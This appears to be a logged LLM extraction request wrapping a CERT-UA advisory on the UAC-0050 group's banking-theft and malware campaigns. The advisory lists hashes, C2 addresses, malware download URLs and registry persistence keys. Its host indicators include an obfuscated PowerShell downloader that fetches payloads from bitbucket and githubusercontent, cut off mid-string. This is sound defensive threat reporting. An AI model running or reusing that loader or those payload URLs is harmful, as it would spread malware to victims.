@@ -1,0 +1,468 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA протягом тривалого часу відстежується активність угрупування UAC-0050. Зважаючи на технологічну інформацію, отриману в результаті дослідження кібератак, можемо стверджувати, що діяльність згаданої групи включає:</p><ul><li>викрадення інформації (кібершпигунство)</li><li>викрадення грошових коштів</li><li>інформаційно-психологічні операції під "брендом" Fire Cells Group.</li></ul><p>Так, протягом вересня-жовтня 2024 року UAC-0050 в результаті отримання несанкціонованого доступу до комп'ютерів бухгалтерів з використанням програмного забезпечення REMCOS / TEKTONITRMS здійснено не менше 30 спроб викрадення грошових коштів з рахунків українських підприємств та фізичних осіб-підприємців шляхом формування/підробки фінансових платежів через системи дистанційного банківського обслуговування. При цьому, суми таких платежів варіюються від десятків тисяч до декількох мільйонів гривень, а час на викрадення може складати від декількох діб до <strong>декількох годин</strong> з моменту первинного ураження комп'ютера. Таким чином, викраденням грошових коштів у фізичних та юридичних осіб, займаються, щонайменше, UAC-0006 (з 2013 року) та UAC-0050. Звертаємо увагу, що ланцюг викрадення грошей, в більшості випадків, передбачає їх конвертацію в криптовалюту.</p><p>Можливість фінансування власних злочинів сприяє інтенсифікації кібератак та можливості закуповувати (в т.ч. ліцензійні) програмні засоби реалізації кіберзагроз, що пояснює використання широкого спектру програм, таких як: REMCOS, TEKTONITRMS, MEDUZASTEALER, LUMMASTEALER, XENORAT, SECTOPRAT, MARSSTEALER, DARKTRACKRAT та ін.</p><p>Крім того, встановлено, що інформаційно-психологічні операції, які здійснюються від імені Fire Cells Group під виглядом розповсюдження повідомлень про мінування будівель, замовні вбивства чи завдання фізичної шкоди майну, також є частиною активності угрупування UAC-0050.</p><p>З метою протидії згаданій кіберзагрозі клієнтам фінансових установ доцільно розглянути запропоновані технічні методи верифікації дій з платежами (створення/модифікація), зокрема, за допомогою додаткової автентифікації через мобільний додаток.</p><p>Якщо Ви бухгалтер і Ваша робота передбачає використання систем дистанційного банківського обслуговування, ми рекомендуємо утриматись від виконання фінансових операцій до моменту увімкнення додаткової автентифікації платежів, застосування на Вашому комп'ютері рекомендованих (штатних) політик захисту (SRP/AppLocker тощо) та встановлення програмних засобів захисту (EDR, "антивірус" та ін.).</p><p>В розділі "Графічні зображення" наведено декілька прикладів ланцюгів інфікування. Слід зауважити, що за вересень-жовтень 2024 року угрупуванням UAC-0050 здійснено більше 15 кібератак.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">b46ef4a62ad75dc65bb0d55bbfcd59a9&nbsp; &nbsp; 93b777a3bf5c868c9fec5465aa912f79e45589d136cb7e32e74c995ac80c8631&nbsp; &nbsp; Документи (СУД).rar&nbsp;
+3a4d72e3e1a517366531590cc58a579a&nbsp; &nbsp; 17504af5f0b685f934404a49fe6ce392cdaa9717b70099635383d450708d3f89&nbsp; &nbsp; Документи (СУД).rar
+3df171ee8218dc8e8baffe34182d431f&nbsp; &nbsp; 5640cb7c1399cf63031ade147e623ad9f9d63fb350addc550eae4141c2fe4431&nbsp; &nbsp; Копія вихідної позовної ухвали.vbs
+229d45a1f1d2186f420e4f0efdec1409&nbsp; &nbsp; f20c466371b9a1447ffd85284b95d8ec4959373f824bf0363b82eaa4ac18b4cf&nbsp; &nbsp; 5652.txt
+22865eb508afb7fabbe06e656568150d&nbsp; &nbsp; 0b6ff11b6bb77a2b5fddd259c021c80096d681e955468e342435ab93d1743cd7&nbsp; &nbsp; Порядок денний до суду.bat
+e4a0088a326a0e2e97c6f261d15c0be0&nbsp; &nbsp; 3e243672f6c94dd0edc7e41d6ab0920b1cd174fe102c71ae73d013c552edd6e4&nbsp; &nbsp; new_image.jpg
+0cea4da7b07c93089db79c994fadb1d7&nbsp; &nbsp; 1a1776acfbc3d21e48b87e7035f3f1180fbd94a5944c5346e447490cbcf474e9&nbsp; &nbsp; one.txt
+1dfd7cbdea62f44e8bd61f5a4d2af502&nbsp; &nbsp; 981b325ff7b02abc081c057a1205926209951b6df2d3b6fd73467621403213ed&nbsp; &nbsp; КОД - 9374094.txt
+974e6cfd1ef96ef09c82a85823496882&nbsp; &nbsp; 82dd31a160c659f51931971265d5592918cd983ad4d3c8576c48523910a7aa04&nbsp; &nbsp; remcos.exe
+1257df439adf16f3b4120ae1f0597ab4&nbsp; &nbsp; 18570fe19bfd89075e536d42dea3b8917e8818f2b0536df94c996a70c93a0b94&nbsp; &nbsp; Xeno RAT.exe
+9e0e18235e99064f3c4290fb2d0deb99&nbsp; &nbsp; a195b64eaae8353c3de14d8e02849a0f30593859bdc2fb443ad5f9db9a803168&nbsp; &nbsp; testpowershell.exe
+72a24df8d4657a459f83b23f3ac933af&nbsp; &nbsp; 4087d005187230b1f8ce7f58642a082aaa65e830034075eebffa271403a2a043&nbsp; &nbsp; remcos.exe
+36219c4f77fabbc875a8a77de0957d5e&nbsp; &nbsp; 84dab25530ba75d9610b9b7e7f8665ba066679cb1e433d7657f9b0577e37717d&nbsp; &nbsp; scan_documet_027839.rar
+a5a98320f9ac5232423dbde020b8af40&nbsp; &nbsp; cb6c92921e3bc58250684d6bd5dda9b92d22917f2d5e7b137c9694907309e986&nbsp; &nbsp; scan_documet_027839.vbs
+3d4d2c732c40acd35bea1c296ba30f5a&nbsp; &nbsp; 700a9a6eb11bbae7ef16e727c44913861a12510c5a4b8450ce6c33f616cf1df5&nbsp; &nbsp; img_test.jpg
+e0d39b0a0496243d533fe927251c3b32&nbsp; &nbsp; 02be347bd34ba0a7ad2c5e50d1f74e88e0222eaa96ae3255c2eaa7e162c48d88&nbsp; &nbsp; img_test.jpg
+63d9007e885f21c52504a091d7688181&nbsp; &nbsp; 03fc22f699ba6ce9fa37f68c96fc35b6b6f8bdc7c55944977653fe2de6e1adad&nbsp; &nbsp; one.txt
+48615476a84b7287deb1a82fa0681509&nbsp; &nbsp; 3fd70b4f8323846dc2fe45930893595b3bc5e9193b58e322024e8ef51aaf5c8c&nbsp; &nbsp; jfa.exe
+47af950e0f1f31ba00a0c57ec9b084c7&nbsp; &nbsp; 99c5e639d2577a3671754bb206272d1c266fb96fe62f0d1a58c7cf72a44ddee7&nbsp; &nbsp; serv.exe
+ca8f4e7d52aaa9b0ec1407b806345db9&nbsp; &nbsp; 4c025933bb335f4d30ed588f2964ed0d0236a36917b47e832a54b1ac256a1ffa&nbsp; &nbsp; ash.exe
+d189ae43ea803340ad94e35f3ee0915a&nbsp; &nbsp; fac32e855e42ca755902dc855a72653eee82f46259c4132a847e2c0cb1f45876&nbsp; &nbsp; ivan.txt
+f510b2722913b6e4ff8cf5661e2330d2&nbsp; &nbsp; f952510ed8607a08fb8ea1ae2b29fdbed8afbc31ee35e0a182e4a3eacd8e563d&nbsp; &nbsp; ivan.exe
+aaa32f87e6c5caefb4770bcf29c7dda3&nbsp; &nbsp; 39827099d3204bacaeeb26faf0bc00d7d9832da6f6d3ab914c1af14e3e8ab3aa&nbsp; &nbsp; 8091.exe
+872f7ca18a26c3692e366b922d1cc756&nbsp; &nbsp; 63473a06f24f1bc9a47f141e321b1aa9150e3a33e80190f3e8bc3ec814d5fe6a&nbsp; &nbsp; jfa.txt
+1f2975ae950979babd41856eecc5e911&nbsp; &nbsp; f8cc03d9209b7a16cbc17eff0dcbd5c5ff6e346fc941feef2896673697d43007&nbsp; &nbsp; ash.txt
+0193fc7db239cbbf20b3773ac27c3696&nbsp; &nbsp; 2d62757a158c106955e7a041278a42371066209e8fabe9905cd8fa832b15452d&nbsp; &nbsp; 80.txt
+602b57e32258293aa6cf7211dc28bebc&nbsp; &nbsp; 7a3de858fad4871d76df43dea61f493be5c47ccee5bd29d907cddd649ae94f1d&nbsp; &nbsp; 80.exe
+1646f15c50014cd286c26970f72c721b&nbsp; &nbsp; ad0d115e1667adc8e6fd553bf4ac1f0d6bc38c522e7035a850513d349faa8692&nbsp; &nbsp; two.txt
+92ec727033235e94e2e9dcc03a9ef8e1&nbsp; &nbsp; 3528cb6d76af5498a6c8e4eb15f230adea64810acb9959aab2e326620a644770&nbsp; &nbsp; 8091.txt
+3befb9b16ab729cb25c9ec206bdd9f8d&nbsp; &nbsp; 7f80785c9540ba6435c7d708e4bdd97887fb61efe3b4760ab86e1ced92f72b75&nbsp; &nbsp; two.exe
+69e9b53f7456016ee4517f45e6fc440b&nbsp; &nbsp; c6ab3f142b6c70146102748002eaad2b5b8279588f61a19c153cb48a5266769d&nbsp; &nbsp; serv.txt
+60ab004024e8d5adae3fcd266c122563&nbsp; &nbsp; a1045efd2ad4e4adac06966158f2f021a0f8bc87f6317324f45807d8121c0671&nbsp; &nbsp; putty.txt
+a3ccfd0aa0b17fd23aa9fd0d84b86c05&nbsp; &nbsp; d4ffa4559a1e22167933772d82cf714cd4bb7a0e79511c2424e18bdb619d63a4&nbsp; &nbsp; putty.exe
+b373fc25283d5b207d45380e9cecba48&nbsp; &nbsp; dda410b4294df67bbc335822b1b633cbb330c652a794224687cd36f1a18c4a55&nbsp; &nbsp; lumma.exe
+a529da4a23578aa5c4198936066f5ea2&nbsp; &nbsp; 54d85bbc1b17e87026468b5eb256476620462a62fa3f64a2351536afbe3c6bbe&nbsp; &nbsp; stea.exe
+aa9a238281d6dfd8a57e40752ba4d07e&nbsp; &nbsp; 7af9835de4edb99cdf9b58103db76bcbbcb7e8bd57a3caa5f8d7857cc41b63cb&nbsp; &nbsp; 970.txt
+f711ddd685a3e0c0c2cbb256987b4203&nbsp; &nbsp; 0f54d7521fbe5a5105433e7b16d18a149cb6c311fc20de634837c33d2ec38000&nbsp; &nbsp; 970.exe
+8bbb87f6168856ffbe2b1a0b0f2a6db3&nbsp; &nbsp; c805a026d5f4b80f6981050a137fb6655e50c2b9b2455bdf5561dff40cdc5f83&nbsp; &nbsp; lumma.txt
+2c69e12d42f253e59ad4528ff733d824&nbsp; &nbsp; a86d697edbfff909716ac701f212e34e2bbd718b463e28999275b6303a54dac2&nbsp; &nbsp; stea.txt
+e63464b04abe0d35705134666dfa7c5f&nbsp; &nbsp; 3960178b1746c788ce2629d3c4ccd76b9c3b1e1a3cc01de77b2d5e7eb6aa2271&nbsp; &nbsp; one.exe
+d1d0573e62a1f7309a1266c55c052bee&nbsp; &nbsp; e7a3f19e416b61a8ecd48993b49d1aae88d9ef5c5cfdc2d7ca7ed184f5e1bb9f&nbsp; &nbsp; medusa.exe
+ed620fb41d32c4716611d652d5646aed&nbsp; &nbsp; ef771b151a995a4e3f565f2487ad3a5edc1744dece5858e3f3190da169c37414&nbsp; &nbsp; Платіжні документи.zip&nbsp;
+0524cbdb10ef3b2db44a5760651d6907&nbsp; &nbsp; ce165fa419e43e0301900a91db02cbd8946a4e7339207eb4a37a3fca469b3536&nbsp; &nbsp; Gdrive - КОД - 7093309.txt
+324fcc037b5fdbd13f215e72c6fb9de1&nbsp; &nbsp; bf9536e1843762dce2c6fb128944a8cd35201e0ca2ca22ed250c951c243f2d0a&nbsp; &nbsp; Для збереження конфіденційності встановлено автоматичний код доступу до файлу.pdf
+c7c365fcec491a75854608edb692bb9e&nbsp; &nbsp; 49c4fb1f92aa13d8791f43cfc039c549ad3fad7ebf115373593557dce07624c3&nbsp; &nbsp; Платіжні документи.rar
+2e401b1d91dfbbb5d3cba4355ed4063c&nbsp; &nbsp; ff1cfb2ff5cec597bd7163ab40e8e33b4729eddd1a76e13b8f759a9b0ff35afc&nbsp; &nbsp; Платіжне доручення.vbs
+d024a106a4d0a537aa254a0d917540ae&nbsp; &nbsp; 96a30bb4a3b4a1287cc044cbbe36dc8e6987286369138a6a65fc071656472bc4&nbsp; &nbsp; one.txt
+ab1766e20f7dcd989dbe5178f79f1021&nbsp; &nbsp; f3d1ba12a5642f65761296e6b5c32c5293864c8413c5fb31d2879b82ac11d298&nbsp; &nbsp; Копія з позначкою банку.vbs
+bbc6e31bcca7dec6cbe59cbf4ece59de&nbsp; &nbsp; b69890fccd0752a0949536c830600588b512de0d1baa4d33b0a6576e8a70837a&nbsp; &nbsp; medusa.txt
+75af34843632a6a54a9c11cb13c2cb05&nbsp; &nbsp; 335fb0323a8bdb2b5800a2b7b4491a598e61e463f4030d6777a2476afab9409b&nbsp; &nbsp; Документи.zip
+1664d5f3dc065840b88ee13b4b929e16&nbsp; &nbsp; acb3954b95e3c897d5ac69a8cc09ed81aace7b3193aa637f5ceb2a4a23204078&nbsp; &nbsp; Документи.pdf.lnk
+9d26cee91cd86b11808a161681be9f85&nbsp; &nbsp; c3dee07cba853e66489d883ef5bcc094ea32861828ebfcde773e7527726be35c&nbsp; &nbsp; 6706e721f2c06.exe
+197121c31d871b52043661f8a43eb8f8&nbsp; &nbsp; e6323e41dcf85f5519e875fa23f7800fa155c5ed8428edbf8971106f9c7aced7&nbsp; &nbsp; CABINET
+cf229a487670d264355f4511a3ce2886&nbsp; &nbsp; db2ebd4553854780e6f3d40204c4f57a975b8ee5693e7d36df01626810e34e91&nbsp; &nbsp; 6706e721f2c06.vbs
+89accddf2e92386cdfdbfd410bfe19cd&nbsp; &nbsp; 1ed89455926fa74be48cb396d89a3d9cf350620a23a362531144b133c5f719f0&nbsp; &nbsp; ciFcnfn.txt
+facba053354b90a0952001ae56181ec6&nbsp; &nbsp; 2c582e545f301eed5d1e2a96aa77f1a329889e82b5e88276faa6946fa2b69af5&nbsp; &nbsp; knSfcpm.txt
+fa858768d8c5ac5167e1b24bc8da23cc&nbsp; &nbsp; 94c7dd6a0e2c0067b727a2879bd0bae449394c57662bc1bd9ee16a0f1aecc632&nbsp; &nbsp; remcos.exe
+02f9b06f49c7d68f88274c6cf330ca90&nbsp; &nbsp; fa2321f16a3dca739f4b5930d5dc720b6699f03395bb5a0a2699cb2656b9d699&nbsp; &nbsp; ciFcnfn.exe
+1b8a04e03b265d0397c024b692e25c6e&nbsp; &nbsp; 76efb280fc1d0ddf376aef018f26f3185fbd80990fb283ff02f522ead480b207&nbsp; &nbsp; dwn_payload_file
+d7d10ec84c543719e58c9b5bb2ed52f7&nbsp; &nbsp; 10bfd8093b573324b4d739d761be71995bf941f8d4cf8505bcd594a39c29f929&nbsp; &nbsp; CABINET
+3ab49c12b0bfcbb323bb5a1d340107ff&nbsp; &nbsp; 333773edb783ec93040e6cf60f1873095f59606ae6dd376128bf44111551fe36&nbsp; &nbsp; one.vbs
+5699d5b44379624ebc78078a1b85e18c&nbsp; &nbsp; 06363ca6381d7c68f453b58f0566966caa9169c25dea626cfcb7001a3dd7bc5f&nbsp; &nbsp; PdfReaderEn.EXE
+18ce19b57f43ce0a5af149c96aecc685&nbsp; &nbsp; d8b7c7178fbadbf169294e4f29dce582f89a5cf372e9da9215aa082330dc12fd&nbsp; &nbsp; Referral.pif
+a61cd75428195955c56a9eef603912ce&nbsp; &nbsp; 8c9e7ab10c40aaea832b0c5704108f9390c5982bd25a32c8602794613b4e9cd4&nbsp; &nbsp; H
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">(tcp)://101[.]99.93.108:1723
+(tcp)://101[.]99.93.108:2404
+(tcp)://101[.]99.93.108:465
+(tcp)://101[.]99.93.108:80
+(tcp)://101[.]99.93.108:8080
+(tcp)://101[.]99.93.108:8091
+(tcp)://101[.]99.93.144:2404
+(tcp)://101[.]99.93.144:465
+(tcp)://101[.]99.93.144:4899
+(tcp)://101[.]99.93.144:50255
+(tcp)://101[.]99.93.144:80
+(tcp)://101[.]99.93.144:8080
+(tcp)://101[.]99.94.69:21
+(tcp)://101[.]99.94.69:2404
+(tcp)://101[.]99.94.69:44444
+(tcp)://101[.]99.94.69:4899
+(tcp)://101[.]99.94.69:80
+(tcp)://101[.]99.94.69:8090
+(tcp)://111[.]90.147.146:21
+(tcp)://111[.]90.147.146:2404
+(tcp)://111[.]90.147.146:465
+(tcp)://111[.]90.147.146:54750
+(tcp)://111[.]90.147.146:80
+(tcp)://111[.]90.147.146:8080
+(tcp)://111[.]90.147.147:5652
+(tcp)://111[.]90.147.147:80
+(tcp)://111[.]90.147.147:8091
+(tcp)://111[.]90.148.191:15666
+(tcp)://157[.]20.182.18:4449
+(tcp)://172[.]86.68.37:7363
+(tcp)://213[.]109.202.97:15647
+(tcp)://45[.]143.166.100:52336
+(tcp)://77[.]105.161.194:80
+hXXp://77[.]105.161.194/file/6706e721f2c06[.]exe
+hXXp://avoufshire[.]icu/cee6b323faaaf788.php
+hXXp://qwdfewf[.]com/dwn_legit_file
+hXXp://qwdfewf[.]com/dwn_payload_file
+hXXp://qwdfewf[.]com/reg_auth_machine
+hXXps://bitbucket[.]org/filedataup/up/downloads/Документи.zip
+hXXps://bitbucket[.]org/fwfsfw/fwf/downloads/fkfjirc.txt
+hXXps://bitbucket[.]org/fwfsfw/fwf/downloads/kfriakr.txt
+hXXps://bitbucket[.]org/fwfsfw/fwf/downloads/knsfcpm.txt
+hXXps://bitbucket[.]org/gdffffffff/ddddd/downloads/img_test.jpg?11811735
+hXXps://bitbucket[.]org/hgdfhdfgd/test/downloads/new_image.jpg?11811735
+hXXps://bitbucket[.]org/hgdfhdfgd/test/downloads/new_image.jpg?14441723
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/5652.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/80.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/8091.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/970.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/ash.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/ivan.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/jfa.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/lumma.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/medusa.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/one.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/putty.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/serv.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/serv7.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/stea.txt
+hXXps://bitbucket[.]org/sdgw/sdge/downloads/two.txt
+hXXps://bitbucket[.]org/sharedua/ua/downloads/scan_documet_027839.rar
+hXXps://bitbucket[.]org/shieldadas/gsdghjj/downloads/img_test.jpg?11811735
+hXXps://raw.githubusercontent[.]com/santomalo/audit/main/img_test.jpg?14441723
+101[.]99.93.108
+101[.]99.93.144
+101[.]99.94.69
+111[.]90.147.146
+111[.]90.147.147
+111[.]90.148.191
+157[.]20.182.18
+172[.]86.68.37
+185[.]185.71.79
+213[.]109.202.97
+45[.]143.166.100
+77[.]105.161.194
+avoufshire[.]icu
+basedsymsotp[.]shop
+charistmatwio[.]shop
+commisionipwn[.]shop
+complainnykso[.]shop
+faillymoodkywko[.]shop
+grassemenwji[.]shop
+ignoracndwko[.]shop
+preachstrwnwjw[.]shop
+stitchmiscpaew[.]shop
+qwdfewf[.]com
+</pre><pre class="hidden" spellcheck="false">tcp://101.99.93.108:1723
+tcp://101.99.93.108:2404
+tcp://101.99.93.108:465
+tcp://101.99.93.108:80
+tcp://101.99.93.108:8080
+tcp://101.99.93.108:8091
+tcp://101.99.93.144:2404
+tcp://101.99.93.144:465
+tcp://101.99.93.144:4899
+tcp://101.99.93.144:50255
+tcp://101.99.93.144:80
+tcp://101.99.93.144:8080
+tcp://101.99.94.69:21
+tcp://101.99.94.69:2404
+tcp://101.99.94.69:44444
+tcp://101.99.94.69:4899
+tcp://101.99.94.69:80
+tcp://101.99.94.69:8090
+tcp://111.90.147.146:21
+tcp://111.90.147.146:2404
+tcp://111.90.147.146:465
+tcp://111.90.147.146:54750
+tcp://111.90.147.146:80
+tcp://111.90.147.146:8080
+tcp://111.90.147.147:5652
+tcp://111.90.147.147:80
+tcp://111.90.147.147:8091
+tcp://111.90.148.191:15666
+tcp://157.20.182.18:4449
+tcp://172.86.68.37:7363
+tcp://213.109.202.97:15647
+tcp://45.143.166.100:52336
+tcp://77.105.161.194:80
+http://77.105.161.194/file/6706e721f2c06.exe
+http://avoufshire.icu/cee6b323faaaf788.php
+http://qwdfewf.com/dwn_legit_file
+http://qwdfewf.com/dwn_payload_file
+http://qwdfewf.com/reg_auth_machine
+https://bitbucket.org/filedataup/up/downloads/Документи.zip
+https://bitbucket.org/fwfsfw/fwf/downloads/fkfjirc.txt
+https://bitbucket.org/fwfsfw/fwf/downloads/kfriakr.txt
+https://bitbucket.org/fwfsfw/fwf/downloads/knsfcpm.txt
+https://bitbucket.org/gdffffffff/ddddd/downloads/img_test.jpg?11811735
+https://bitbucket.org/hgdfhdfgd/test/downloads/new_image.jpg?11811735
+https://bitbucket.org/hgdfhdfgd/test/downloads/new_image.jpg?14441723
+https://bitbucket.org/sdgw/sdge/downloads/5652.txt
+https://bitbucket.org/sdgw/sdge/downloads/80.txt
+https://bitbucket.org/sdgw/sdge/downloads/8091.txt
+https://bitbucket.org/sdgw/sdge/downloads/970.txt
+https://bitbucket.org/sdgw/sdge/downloads/ash.txt
+https://bitbucket.org/sdgw/sdge/downloads/ivan.txt
+https://bitbucket.org/sdgw/sdge/downloads/jfa.txt
+https://bitbucket.org/sdgw/sdge/downloads/lumma.txt
+https://bitbucket.org/sdgw/sdge/downloads/medusa.txt
+https://bitbucket.org/sdgw/sdge/downloads/one.txt
+https://bitbucket.org/sdgw/sdge/downloads/putty.txt
+https://bitbucket.org/sdgw/sdge/downloads/serv.txt
+https://bitbucket.org/sdgw/sdge/downloads/serv7.txt
+https://bitbucket.org/sdgw/sdge/downloads/stea.txt
+https://bitbucket.org/sdgw/sdge/downloads/two.txt
+https://bitbucket.org/sharedua/ua/downloads/scan_documet_027839.rar
+https://bitbucket.org/shieldadas/gsdghjj/downloads/img_test.jpg?11811735
+https://raw.githubusercontent.com/santomalo/audit/main/img_test.jpg?14441723
+101.99.93.108
+101.99.93.144
+101.99.94.69
+111.90.147.146
+111.90.147.147
+111.90.148.191
+157.20.182.18
+172.86.68.37
+185.185.71.79
+213.109.202.97
+45.143.166.100
+77.105.161.194
+avoufshire.icu
+basedsymsotp.shop
+charistmatwio.shop
+commisionipwn.shop
+complainnykso.shop
+faillymoodkywko.shop
+githubusercontent.com
+grassemenwji.shop
+ignoracndwko.shop
+preachstrwnwjw.shop
+stitchmiscpaew.shop
+qwdfewf.com
+</pre><p>&nbsp;<em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%PROGRAMDATA%\rmc\logs.dat
+%PROGRAMDATA%\rmc\
+%APPDATA%\RMS Agent\
+%APPDATA%\RMS Agent\70270\5011615F40\rutserv.exe (Приклад артефакту TEKTONITRMS)
+%APPDATA%\RMS Agent\70270\5011615F40\settings.dat (Приклад артефакту TEKTONITRMS)
+%APPDATA%\RMS Agent\Logs\
+%APPDATA%\RMS Agent\Logs\rms_log_2024-09.html
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\InnoCraft.url
+%LOCALAPPDATA%\DesignInno Innovations\H
+%LOCALAPPDATA%\DesignInno Innovations\InnoCraft.js
+%LOCALAPPDATA%\DesignInno Innovations\InnoCraft.scr
+%TMP%\svhost.vbs
+%TMP%\MicrosoftServiceUpdater.exe
+%TMP%\PdfReaderEn.EXE
+%TMP%\write.bat
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\'My Program'
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\'MyApp'
+HKEY_CURRENT_USER\SOFTWARE\TektonIT
+HKEY_CURRENT_USER\SOFTWARE\TektonIT\Remote Manipulator System\Host\Parameters\'CallbackSettings'
+HKEY_CURRENT_USER\SOFTWARE\TektonIT\Remote Manipulator System\Host\Parameters\'FUSClientPath'
+HKEY_CURRENT_USER\SOFTWARE\goosddfvv-L97IFZ (Приклад артефакту REMCOS)
+powershell.exe $codigo = 'WwBO#GU#d##u#FM#ZQBy#HY#aQBj#GU#U#Bv#Gk#bgB0#E0#YQBu#GE#ZwBl#HI#XQ#6#Do#UwBl#GM#dQBy#Gk#d#B5#F##cgBv#HQ#bwBj#G8#b##g#D0#I#Bb#E4#ZQB0#C4#UwBl#GM#dQBy#Gk#d#B5#F##cgBv#HQ#bwBj#G8#b#BU#Hk#c#Bl#F0#Og#6#FQ#b#Bz#DE#Mg#N##o#I##g#C##I##g#C##I##g#C##I##g#C##ZgB1#G4#YwB0#Gk#bwBu#C##R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#RgBy#G8#bQBM#Gk#bgBr#HM#I#B7#C##c#Bh#HI#YQBt#C##K#Bb#HM#d#By#Gk#bgBn#Fs#XQBd#CQ#b#Bp#G4#awBz#Ck#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#B3#GU#YgBD#Gw#aQBl#G4#d##g#D0#I#BO#GU#dw#t#E8#YgBq#GU#YwB0#C##UwB5#HM#d#Bl#G0#LgBO#GU#d##u#Fc#ZQBi#EM#b#Bp#GU#bgB0#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##J#Bz#Gg#dQBm#GY#b#Bl#GQ#T#Bp#G4#awBz#C##PQ#g#Ec#ZQB0#C0#UgBh#G4#Z#Bv#G0#I##t#Ek#bgBw#HU#d#BP#GI#agBl#GM#d##g#CQ#b#Bp#G4#awBz#C##LQBD#G8#dQBu#HQ#I##k#Gw#aQBu#Gs#cw#u#Ew#ZQBu#Gc#d#Bo#Ds#I##N##o#I##g#C##I##g#C##I##g#C##I##g#C##ZgBv#HI#ZQBh#GM#a##g#Cg#J#Bs#Gk#bgBr#C##aQBu#C##J#Bz#Gg#dQBm#GY#b#Bl#GQ#T#Bp#G4#awBz#Ck#I#B7#C##d#By#Hk#I#B7#C##cgBl#HQ#dQBy#G4#I##k#Hc#ZQBi#EM#b#Bp#GU#bgB0#C4#R#Bv#Hc#bgBs#G8#YQBk#EQ#YQB0#GE#K##k#Gw#aQBu#Gs#KQ#g#H0#I#Bj#GE#d#Bj#Gg#I#B7#C##YwBv#G4#d#Bp#G4#dQBl#C##fQ#g#H0#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I#By#GU#d#B1#HI#bg#g#CQ#bgB1#Gw#b##g#H0#Ow#g##0#Cg#g#C##I##g#C##I##g#C##I##g#C##I##k#Gw#aQBu#Gs#cw#g#D0#I#B##Cg#JwBo#HQ#d#Bw#HM#Og#v#C8#YgBp#HQ#YgB1#GM#awBl#HQ#LgBv#HI#Zw#v#HM#a#Bp#GU#b#Bk#GE#Z#Bh#HM#LwBn#HM#Z#Bn#Gg#agBq#C8#Z#Bv#Hc#bgBs#G8#YQBk#HM#LwBp#G0#ZwBf#HQ#ZQBz#HQ#LgBq#H##Zw#/#DE#MQ#4#DE#MQ#3#DM#NQ#n#Cw#I##n#Gg#d#B0#H##cw#6#C8#LwBy#GE#dw#u#Gc#aQB0#Gg#dQBi#HU#cwBl#HI#YwBv#G4#d#Bl#G4#d##u#GM#bwBt#C8#cwBh#G4#d#Bv#G0#